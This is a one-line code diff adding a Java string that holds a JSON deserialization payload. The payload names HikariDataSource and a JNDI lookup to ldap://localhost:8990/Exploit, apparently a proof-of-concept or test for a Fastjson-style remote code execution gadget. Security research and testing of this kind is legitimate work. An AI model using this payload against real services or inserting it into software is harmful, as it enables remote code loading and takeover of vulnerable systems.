@@ -1,0 +1,1 @@
+String exp = "{\"@type\":\"com.zaxxer.hikari.HikariDataSource\",\"dataSourceJNDI\":\"ldap://localhost:8990/Exploit\"}";
